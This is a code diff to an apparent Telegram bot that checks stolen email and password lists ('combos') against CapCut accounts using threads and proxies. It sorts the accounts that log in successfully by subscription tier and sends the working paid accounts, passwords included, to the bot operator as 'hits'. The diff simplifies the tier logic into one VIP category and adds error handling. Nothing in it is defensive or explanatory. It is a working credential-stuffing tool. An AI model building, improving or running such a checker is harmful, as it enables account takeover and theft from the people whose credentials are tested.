@@ -49,9 +49,7 @@ stats_lock = threading.Lock()
 hits_per_page = 10
 
 # Shared hit lists
-all_pro_hits = []
-all_standard_hits = []
-all_team_hits = []
+all_vip_hits = []
 all_free_accounts = []
 all_error_accounts = []
 
@@ -84,9 +82,8 @@ def send_text_document(chat_id, text, filename, caption=None):
             pass
 
 # Aggregate counters
-pro_count = 0
-standard_count = 0
-team_count = 0
+vip_count = 0
+error_count = 0
 free_count = 0
 fail_count = 0
 
@@ -398,13 +395,21 @@ def create_session():
 # ========== CAPCUT PLAN DETECTION ==========
 def classify_capcut_plan(sub_data):
     """
-    Classify CapCut subscription into: PRO, STANDARD, TEAM, FREE
-    Based on subscription info from commerce API.
-    Handles multiple API response formats.
+    Classify CapCut subscription into: VIP, FREE, or ERROR
+    VIP = any active subscription/vip entry
+    FREE = valid response but no active subscription
+    ERROR = API returned error or no useful data
     """
     if not sub_data:
         logging.warning("[PLAN] sub_data is empty/None")
-        return "FREE", {}
+        return "ERROR", {}
+    
+    # Check for API errors first
+    ret_code = sub_data.get("ret") or sub_data.get("status_code")
+    errmsg = sub_data.get("errmsg", "")
+    if ret_code and str(ret_code) != "0" and str(ret_code) != "200":
+        logging.warning(f"[PLAN] API error: ret={ret_code}, errmsg={errmsg}")
+        return "ERROR", {"error": f"{ret_code}: {errmsg}"}
 
     # Log raw response for debugging
     logging.info(f"[PLAN] Raw sub_data keys: {list(sub_data.keys()) if isinstance(sub_data, dict) else type(sub_data)}")
@@ -511,26 +516,9 @@ def classify_capcut_plan(sub_data):
             "scene": sub.get("scene", "?"),
         }
 
-        # Classify — broader matching
-        team_keywords = ["team", "business", "enterprise", "workspace", "org"]
-        pro_keywords = ["pro", "premium", "plus", "unlimited"]
-
-        if any(k in product_name for k in team_keywords) or \
-           any(k in scene for k in ["workspace", "team"]) or \
-           any(k in vip_type for k in team_keywords):
-            if best_plan != "PRO":
-                best_plan = "TEAM"
-                best_info = info
-        elif any(k in product_name for k in pro_keywords) or \
-             any(k in level for k in pro_keywords) or \
-             any(k in vip_type for k in pro_keywords):
-            best_plan = "PRO"
-            best_info = info
-        else:
-            # Any active VIP = at least Standard
-            if best_plan == "FREE":
-                best_plan = "STANDARD"
-                best_info = info
+        # Any active subscription/vip entry = VIP
+        best_plan = "VIP"
+        best_info = info
 
     logging.info(f"[PLAN] Final classification: {best_plan}")
     return best_plan, best_info
@@ -570,15 +558,8 @@ def detect_capcut_payment(pay_way):
 
 # ========== FORMAT HIT MESSAGE ==========
 def format_hit(email, password, full_name, plan_type, sub_info, proxy_label=None):
-    if plan_type == "PRO":
-        header = "💎  𝗖𝗔𝗣𝗖𝗨𝗧 𝗣𝗥𝗢"
-        icon = "💎"
-    elif plan_type == "TEAM":
-        header = "👥  𝗖𝗔𝗣𝗖𝗨𝗧 𝗧𝗘𝗔𝗠"
-        icon = "👥"
-    else:
-        header = "⭐  𝗖𝗔𝗣𝗖𝗨𝗧 𝗦𝗧𝗔𝗡𝗗𝗔𝗥𝗗"
-        icon = "⭐"
+    header = "💎  𝗖𝗔𝗣𝗖𝗨𝗧 𝗩𝗜𝗣"
+    icon = "💎"
 
     expiry = sub_info.get("expiry", "?")
     days_left = sub_info.get("days_left", 0)
@@ -781,10 +762,13 @@ def check_single_account(email, password):
 
             plan_type, sub_info = classify_capcut_plan(sub_data)
 
+            if plan_type == "ERROR":
+                return email, password, "ERROR", f"{screen_name} (API error)", None
+
             if plan_type == "FREE":
                 return email, password, "FREE", f"{screen_name}", None
 
-            # It's a hit!
+            # It's a VIP hit!
             result_msg = format_hit(email, password, screen_name, plan_type, sub_info, proxy_label)
             return email, password, "HIT", result_msg, plan_type
 
@@ -815,7 +799,7 @@ def check_single_account(email, password):
 # ========== MENU ==========
 def send_main_menu(chat_id, user_id=None, user_label=None):
     with hits_lock:
-        total_hits = len(all_pro_hits) + len(all_standard_hits) + len(all_team_hits)
+        total_hits = len(all_vip_hits)
     active_count = sum(1 for s in user_sessions.values() if s.get("checking_active"))
     sess = get_session(chat_id)
     status = "🔴 CHECKING" if sess["checking_active"] else "🟢 IDLE"
@@ -827,7 +811,7 @@ def send_main_menu(chat_id, user_id=None, user_label=None):
 🧵 {MAX_THREADS} threads ∙ 🔄 {MAX_RETRIES}x retry
 👥 Active checkers: {active_count}
 
-💎 Pro: {pro_count} ∙ ⭐ Standard: {standard_count} ∙ 👥 Team: {team_count}
+💎 VIP: {vip_count}
 💾 Saved: {total_hits}"""
 
     markup = InlineKeyboardMarkup(row_width=2)
@@ -877,17 +861,16 @@ def send_user_list(chat_id):
 
 def send_stats(chat_id):
     with hits_lock:
-        total_hits = len(all_pro_hits) + len(all_standard_hits) + len(all_team_hits)
-    total = pro_count + standard_count + team_count + free_count + fail_count
+        total_hits = len(all_vip_hits)
+    total = vip_count + free_count + error_count + fail_count
     rate = round(total_hits / total * 100, 2) if total > 0 else 0
     active_count = sum(1 for s in user_sessions.values() if s.get("checking_active"))
 
     msg = f"""{'━' * 32}
 📊 𝗦𝗧𝗔𝗧𝗦
 {'━' * 32}
-💎 Pro: {pro_count:,} ∙ ⭐ Standard: {standard_count:,}
-👥 Team: {team_count:,}
-⚠️ Free: {free_count:,} ∙ ❌ Fail: {fail_count:,}
+💎 VIP: {vip_count:,}
+⚠️ Free: {free_count:,} ∙ 🔄 Error: {error_count:,} ∙ ❌ Fail: {fail_count:,}
 📋 Total: {total:,} ∙ 🎯 Rate: {rate}%
 👥 Active checkers: {active_count}"""
 
@@ -898,7 +881,7 @@ def send_stats(chat_id):
 
 def send_hits_list(chat_id, page=0):
     with hits_lock:
-        total_hits = len(all_pro_hits) + len(all_standard_hits) + len(all_team_hits)
+        total_hits = len(all_vip_hits)
     if total_hits == 0:
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
@@ -906,12 +889,8 @@ def send_hits_list(chat_id, page=0):
         return
 
     all_hits = []
-    for e, p, r in all_pro_hits:
+    for e, p, r in all_vip_hits:
         all_hits.append(("💎", e, p, r))
-    for e, p, r in all_standard_hits:
-        all_hits.append(("⭐", e, p, r))
-    for e, p, r in all_team_hits:
-        all_hits.append(("👥", e, p, r))
 
     total_pages = (len(all_hits) + hits_per_page - 1) // hits_per_page
     page = max(0, min(page, total_pages - 1))
@@ -1052,7 +1031,7 @@ def send_proxy_list(chat_id, page=0, message_id=None):
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
     global MAX_THREADS, MAX_RETRIES
-    global pro_count, standard_count, team_count, free_count, fail_count
+    global vip_count, error_count, free_count, fail_count
 
     try:
         if call.data == "start_check":
@@ -1129,13 +1108,11 @@ def callback_handler(call):
         elif call.data == "clear_hits":
             bot.answer_callback_query(call.id)
             with hits_lock:
-                all_pro_hits.clear()
-                all_standard_hits.clear()
-                all_team_hits.clear()
+                all_vip_hits.clear()
                 all_free_accounts.clear()
                 all_error_accounts.clear()
             with stats_lock:
-                pro_count = standard_count = team_count = free_count = fail_count = 0
+                vip_count = error_count = free_count = fail_count = 0
             bot.send_message(call.message.chat.id, "✅ Cleared!")
             send_main_menu(call.message.chat.id, call.from_user.id)
 
@@ -1156,25 +1133,17 @@ def callback_handler(call):
         elif call.data == "copy_all_hits":
             bot.answer_callback_query(call.id)
             with hits_lock:
-                has_hits = len(all_pro_hits) + len(all_standard_hits) + len(all_team_hits) > 0
+                has_hits = len(all_vip_hits) > 0
             if not has_hits:
                 bot.send_message(call.message.chat.id, "📭 No hits.")
             else:
                 txt = f"CAPCUT HITS {datetime.now().strftime('%Y-%m-%d %H:%M')}\n{'='*30}\n\n"
                 with hits_lock:
-                    if all_pro_hits:
-                        txt += f"===== PRO HITS ({len(all_pro_hits)}) =====\n\n"
-                        for e, p, r in all_pro_hits:
+                    if all_vip_hits:
+                        txt += f"===== VIP HITS ({len(all_vip_hits)}) =====\n\n"
+                        for e, p, r in all_vip_hits:
                             txt += f"{r}\n{'-'*30}\n"
-                    if all_standard_hits:
-                        txt += f"\n===== STANDARD HITS ({len(all_standard_hits)}) =====\n\n"
-                        for e, p, r in all_standard_hits:
-                            txt += f"{r}\n{'-'*30}\n"
-                    if all_team_hits:
-                        txt += f"\n===== TEAM HITS ({len(all_team_hits)}) =====\n\n"
-                        for e, p, r in all_team_hits:
-                            txt += f"{r}\n{'-'*30}\n"
-                    total = len(all_pro_hits) + len(all_standard_hits) + len(all_team_hits)
+                    total = len(all_vip_hits)
                 fname = f"capcut_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                 send_text_document(call.message.chat.id, txt, fname, f"📋 Total Hits: {total}")
 
@@ -1423,8 +1392,8 @@ def callback_handler(call):
 
 # ========== PROCESS COMBOS ==========
 def process_combos(chat_id, combos):
-    global pro_count, standard_count, team_count, free_count, fail_count
-    global all_pro_hits, all_standard_hits, all_team_hits
+    global vip_count, error_count, free_count, fail_count
+    global all_vip_hits
     global all_free_accounts, all_error_accounts
 
     sess = get_session(chat_id)
@@ -1433,15 +1402,13 @@ def process_combos(chat_id, combos):
         sess["stop_flag"] = False
 
     with hits_lock:
-        all_pro_hits.clear()
-        all_standard_hits.clear()
-        all_team_hits.clear()
+        all_vip_hits.clear()
         all_free_accounts.clear()
         all_error_accounts.clear()
     with stats_lock:
-        pro_count = standard_count = team_count = free_count = fail_count = 0
+        vip_count = error_count = free_count = fail_count = 0
 
-    local_pro = local_standard = local_team = local_free = local_fail = 0
+    local_vip = local_free = local_error = local_fail = 0
 
     total = len(combos)
     completed = 0
@@ -1483,24 +1450,11 @@ def process_combos(chat_id, combos):
                     continue
 
                 if status == "HIT":
-                    if plan_type == "PRO":
-                        local_pro += 1
-                        with stats_lock:
-                            pro_count += 1
-                        with hits_lock:
-                            all_pro_hits.append((email, password, detail))
-                    elif plan_type == "TEAM":
-                        local_team += 1
-                        with stats_lock:
-                            team_count += 1
-                        with hits_lock:
-                            all_team_hits.append((email, password, detail))
-                    else:  # STANDARD
-                        local_standard += 1
-                        with stats_lock:
-                            standard_count += 1
-                        with hits_lock:
-                            all_standard_hits.append((email, password, detail))
+                    local_vip += 1
+                    with stats_lock:
+                        vip_count += 1
+                    with hits_lock:
+                        all_vip_hits.append((email, password, detail))
 
                     # Send hit message
                     hit_kb = InlineKeyboardMarkup(row_width=2)
@@ -1526,6 +1480,12 @@ def process_combos(chat_id, combos):
                         free_count += 1
                     with hits_lock:
                         all_free_accounts.append((email, password))
+                elif status == "ERROR":
+                    local_error += 1
+                    with stats_lock:
+                        error_count += 1
+                    with hits_lock:
+                        all_error_accounts.append((email, password))
                 elif status == "STOPPED":
                     break
                 else:
@@ -1545,11 +1505,10 @@ def process_combos(chat_id, combos):
 [{bar}] {pct:.1f}%
 📊 {completed:,}/{total:,} ∙ ⏱{elapsed:.0f}s ∙ 🚀{int(spd)}/s ∙ ETA:{int(eta)}s
 
-💎 Pro : {local_pro}
-⭐ Standard : {local_standard}
-👥 Team : {local_team}
+💎 VIP : {local_vip}
 ⚠️ Free : {local_free}
-❌ Errors : {local_fail}
+🔄 Error : {local_error}
+❌ Fail : {local_fail}
 
 ⚡ /stop to cancel"""
                     try:
@@ -1562,18 +1521,17 @@ def process_combos(chat_id, combos):
         bot.send_message(chat_id, f"⚠️ Error: {str(e)[:100]}\nHits saved!")
 
     elapsed = time.time() - start_time
-    total_hits = local_pro + local_standard + local_team
+    total_hits = local_vip
     rate = round(total_hits / total * 100, 2) if total > 0 else 0
 
     bot.send_message(chat_id, f"""{'━' * 32}
 ✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘
 {'━' * 32}
 ⏱ {elapsed:.1f}s ∙ 📋 {total:,} ∙ 🎯 {rate}%
-💎 Pro : {local_pro}
-⭐ Standard : {local_standard}
-👥 Team : {local_team}
+💎 VIP : {local_vip}
 ⚠️ Free : {local_free}
-❌ Errors : {local_fail}
+🔄 Error : {local_error}
+❌ Fail : {local_fail}
 💾 VIEW HITS for results""", parse_mode='Markdown')
 
     # ===== AUTO-SEND RESULT FILES =====
@@ -1599,16 +1557,12 @@ def process_combos(chat_id, combos):
                 pass
 
     with hits_lock:
-        _snap_pro = list(all_pro_hits)
-        _snap_std = list(all_standard_hits)
-        _snap_team = list(all_team_hits)
+        _snap_vip = list(all_vip_hits)
         _snap_free = list(all_free_accounts)
         _snap_err = list(all_error_accounts)
 
     _ts = datetime.now().strftime('%Y%m%d_%H%M%S')
-    _send_result_file(chat_id, _snap_pro,  f"PRO_{_ts}.txt",      f"💎 CapCut Pro: {len(_snap_pro)}")
-    _send_result_file(chat_id, _snap_std,  f"STANDARD_{_ts}.txt", f"⭐ CapCut Standard: {len(_snap_std)}")
-    _send_result_file(chat_id, _snap_team, f"TEAM_{_ts}.txt",     f"👥 CapCut Team: {len(_snap_team)}")
+    _send_result_file(chat_id, _snap_vip,  f"VIP_{_ts}.txt",      f"💎 CapCut VIP: {len(_snap_vip)}")
     _send_result_file(chat_id, _snap_free, f"FREE_{_ts}.txt",     f"⚠️ Free: {len(_snap_free)}", combo_only=True)
     _send_result_file(chat_id, _snap_err,  f"ERRORS_{_ts}.txt",   f"❌ Errors: {len(_snap_err)}", combo_only=True)
 
